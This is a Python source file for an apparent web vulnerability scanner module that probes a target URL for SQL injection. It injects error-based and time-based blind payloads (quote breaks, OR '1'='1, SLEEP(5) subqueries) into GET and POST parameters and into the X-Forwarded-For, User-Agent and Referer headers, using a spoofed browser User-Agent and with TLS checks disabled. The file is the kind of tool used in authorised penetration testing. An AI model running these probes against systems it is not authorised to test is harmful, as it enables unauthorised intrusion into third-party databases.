import asyncio
import time
import requests
import urllib.parse
from typing import List, Dict, Any
from src.desktop.logic.config_manager import ConfigManager

class SQLiProbe:
    """
    SQLi Probe: Error-based and Dynamic Time-based blind SQL injection detection.
    Supports GET, POST and Header injection.
    """
    PAYLOADS_ERROR = ["'", '"', "' OR '1'='1", "' AND 1=2--", "')) OR (('1'='1"]
    PAYLOADS_BLIND = ["' AND SLEEP(5)--", "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
    
    SQL_ERRORS = [
        "sql syntax", "mysql_fetch", "ORA-", "PostgreSQL", 
        "sqlite3", "SQLSTATE", "Microsoft OLE DB Provider for SQL Server",
        "Unclosed quotation mark after the character string",
        "you have an error in your sql syntax"
    ]

    def __init__(self, proxy=None):
        self.config = ConfigManager()
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.headers_base = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

    async def _request(self, method: str, url: str, params: dict = None, data: dict = None, headers: dict = None) -> tuple:
        """Helper to make requests and measure time."""
        start = time.time()
        try:
            # URL encode payloads in params and data
            if params:
                params = {k: urllib.parse.quote(str(v), safe='') for k, v in params.items()}
            if data:
                data = {k: urllib.parse.quote(str(v), safe='') for k, v in data.items()}
            
            h = self.headers_base.copy()
            if headers: h.update(headers)
            
            response = await asyncio.to_thread(
                requests.request, 
                method, url, 
                params=params, data=data, headers=h, 
                proxies=self.proxies, timeout=15, verify=False
            )
            return time.time() - start, response.text
        except Exception as e:
            return 0, ""

    async def get_baseline(self, url: str) -> float:
        """Measure average response time for 3 normal requests."""
        n = self.config.get('sqli', 'baseline_requests', 3)
        times = []
        for _ in range(n):
            duration, _ = await self._request("GET", url)
            if duration > 0: times.append(duration)
        return sum(times) / len(times) if times else 1.0

    async def probe(self, url: str, param: str) -> List[Dict[str, Any]]:
        """Run full SQLi probe on a specific parameter and common headers."""
        resultados = []
        baseline = await self.get_baseline(url)
        umbral = baseline * self.config.get('sqli', 'umbral_multiplicador', 2.5)
        
        # 1. GET Parameter Injection
        base_url, query = url.split("?", 1) if "?" in url else (url, "")
        orig_params = dict(urllib.parse.parse_qsl(query))
        
        for p_error in self.PAYLOADS_ERROR:
            test_params = orig_params.copy()
            test_params[param] = f"{orig_params.get(param, '')}{p_error}"
            _, text = await self._request("GET", base_url, params=test_params)
            if self.detectar_error_sql(text):
                resultados.append({"tipo": "SQLI_ERROR_GET", "valor": f"Param: {param} | Payload: {p_error}"})
                break

        for p_blind in self.PAYLOADS_BLIND:
            test_params = orig_params.copy()
            test_params[param] = f"{orig_params.get(param, '')}{p_blind}"
            duration, _ = await self._request("GET", base_url, params=test_params)
            if duration > umbral and duration > 4.5:
                resultados.append({"tipo": "SQLI_TIME_GET", "valor": f"Param: {param} | Payload: {p_blind}", "evidencia": f"Time: {duration:.2f}s (Baseline: {baseline:.2f}s)"})
                break

        # 2. Header Injection (Optional)
        if self.config.get('sqli', 'probar_headers', True):
            target_headers = ["X-Forwarded-For", "User-Agent", "Referer"]
            for h_name in target_headers:
                for p_error in self.PAYLOADS_ERROR:
                    duration, text = await self._request("GET", url, headers={h_name: p_error})
                    if self.detectar_error_sql(text):
                        resultados.append({"tipo": "SQLI_ERROR_HEADER", "valor": f"Header: {h_name} | Payload: {p_error}"})
                        break

        # 3. POST Injection (Optional - Mocked for same URL)
        if self.config.get('sqli', 'probar_post', True) and orig_params:
            for p_error in self.PAYLOADS_ERROR:
                test_data = orig_params.copy()
                test_data[param] = f"{orig_params.get(param, '')}{p_error}"
                _, text = await self._request("POST", base_url, data=test_data)
                if self.detectar_error_sql(text):
                    resultados.append({"tipo": "SQLI_ERROR_POST", "valor": f"Param: {param} | Payload: {p_error}"})
                    break

        return resultados

    def detectar_error_sql(self, texto: str) -> bool:
        """Check if response contains common SQL error messages."""
        if not texto: return False
        return any(e.lower() in texto.lower() for e in self.SQL_ERRORS)
